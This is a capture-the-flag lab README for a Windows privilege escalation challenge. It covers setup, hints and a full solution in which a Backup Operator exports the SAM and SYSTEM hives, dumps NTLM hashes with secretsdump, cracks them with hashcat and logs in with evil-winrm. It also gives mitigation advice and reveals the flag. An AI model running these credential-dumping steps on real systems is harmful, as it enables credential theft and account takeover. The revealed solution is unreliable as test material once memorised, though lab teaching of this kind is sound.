# Challenge 2 — SAM Database Dump via Backup Operator

**Difficulty:** Hard
**Category:** Windows Privilege Escalation — Credential Extraction
**Flag:** `C:\CTF\candie_office\broomhilda.txt`

---

## Story

You are **Django**. You've gained a foothold as `django` — a Backup Operator on
Calvin Candie's Windows machine. Candie is a local Administrator, and only he can
open the office where Broomhilda is kept.

Backup Operators have a quiet, overlooked power: they can read any file on the system —
including the SAM database where Windows stores password hashes.
Extract Candie's hash. Crack it. Walk through the front door.

---

## Setup

1. Start a **Windows VM**
2. Run PowerShell as Administrator:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
.\setup.ps1
```

3. Log in as `django` / `freedom`

### Tools required (on your attack machine — Kali or Mac)

```bash
pip install impacket
# Provides: secretsdump.py, psexec.py, wmiexec.py
```

Also install: `hashcat` or `john`

---

## Background: Backup Operators & SAM

The **Backup Operators** group exists to allow users to back up and restore files
regardless of file permissions. This includes the SAM hive (`C:\Windows\System32\config\SAM`)
and SYSTEM hive — together they contain all local account NTLM hashes.

Normally these files are locked while Windows is running. But Backup Operators can use
`reg save` to export them to a readable location — it uses the Backup privilege
(`SeBackupPrivilege`) to bypass the lock and access restrictions.

---

## Hints

<details>
<summary>Hint 1</summary>
Confirm your group membership and privileges:

```cmd
whoami /groups
whoami /priv
```

Look for `Backup Operators` in groups and `SeBackupPrivilege` in privileges.
</details>

<details>
<summary>Hint 2</summary>
Use `reg save` to export the SAM and SYSTEM hives to a location you control:

```cmd
reg save HKLM\SAM C:\Users\django\Desktop\SAM
reg save HKLM\SYSTEM C:\Users\django\Desktop\SYSTEM
```

Transfer them to your attack machine.
</details>

<details>
<summary>Hint 3</summary>
Use `secretsdump.py` from Impacket to extract NTLM hashes offline:

```bash
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

Then crack the hash with hashcat:
```bash
hashcat -m 1000 <hash> /usr/share/wordlists/rockyou.txt
```
</details>

---

## Solution

<details>
<summary>Click to reveal — try on your own first!</summary>

### Step 1 — Confirm Backup Operator membership

```cmd
whoami /groups | findstr Backup
whoami /priv | findstr Backup
```

```
BUILTIN\Backup Operators
SeBackupPrivilege    Back up files and directories    Enabled
```

### Step 2 — Export the SAM and SYSTEM hives

```cmd
reg save HKLM\SAM C:\Users\django\Desktop\SAM
reg save HKLM\SYSTEM C:\Users\django\Desktop\SYSTEM
```

Transfer both files to your Kali/Mac attack machine.

### Step 3 — Extract hashes with secretsdump

```bash
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

Output:
```
[*] Dumping local SAM hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:...
candie:1001:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>
django:1002:aad3b435b51404eeaad3b435b51404ee:...
```

### Step 4 — Crack Candie's hash

```bash
hashcat -m 1000 <CANDIE_NTLM_HASH> /usr/share/wordlists/rockyou.txt
```

Result: `Candie$Plantation1858`

### Step 5 — Authenticate as Candie and read the flag

Option A — local login on the VM:
Log out and log in as `candie` / `Candie$Plantation1858`

```powershell
type C:\CTF\candie_office\broomhilda.txt
```

Option B — remote with evil-winrm (if WinRM is enabled):
```bash
evil-winrm -i <VM_IP> -u candie -p 'Candie$Plantation1858'
```

```
CTF{s4m_dumped_h4sh_cr4ck3d_dj4ng0}
```

### Why this works

The SAM database stores NTLM hashes for all local accounts. While the file is locked
at runtime, Backup Operators can use `SeBackupPrivilege` to read it via `reg save`.
This is a documented and common privilege escalation path. Mitigation: audit Backup
Operators group membership — it should contain only dedicated backup service accounts,
never interactive user accounts. Additionally, enable Credential Guard to protect
credentials in memory from extraction tools.

</details>
